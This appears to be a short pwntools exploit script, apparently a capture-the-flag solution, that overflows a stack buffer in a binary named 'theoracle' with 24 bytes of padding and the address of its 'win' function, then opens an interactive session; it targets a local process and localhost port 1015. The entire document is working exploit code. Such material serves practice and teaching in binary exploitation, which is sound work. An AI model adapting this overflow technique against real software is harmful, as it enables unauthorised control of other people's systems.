from pwn import *

p = process('./theoracle')
gdb.attach(p)
p = remote('localhost', 1015)
e = ELF('./theoracle')

payload = b'A' * 24 + p64(e.symbols['win'])

p.sendline(payload)

p.interactive()
